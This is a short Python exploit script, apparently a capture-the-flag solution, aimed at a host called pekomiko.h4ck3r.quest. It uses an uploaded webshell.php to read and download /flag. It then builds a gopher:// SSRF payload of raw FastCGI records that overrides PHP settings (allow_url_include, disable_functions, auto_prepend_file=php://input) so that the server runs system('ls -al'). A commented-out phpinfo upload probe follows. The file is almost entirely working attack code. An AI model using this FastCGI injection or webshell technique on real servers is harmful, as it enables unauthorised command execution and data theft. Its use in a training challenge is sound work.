import requests

s = requests.Session()


r = s.post("https://pekomiko.h4ck3r.quest/uploads/webshell.php#", data={
    'action': 'viewer',
    'dir': '',
    'file': '/flag',
})
# print(r.text)

r = s.post("https://pekomiko.h4ck3r.quest/uploads/webshell.php#", data={
    'action': 'download',
    'dir': '',
    'file': '/flag',
})
print(r.text)

url = "gopher://https://pekomiko.h4ck3r.quest/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH25%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file=php://input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%19%04%00<?php system('ls -al');?>%00%00%00%00"

# import requests

# files = {
#   'file': ("aa.txt","ssss")
# }
# url = "https://pekomiko.h4ck3r.quest/phpinfo.php"
# r = requests.post(url=url, files=files, allow_redirects=False)
# print(r.text)
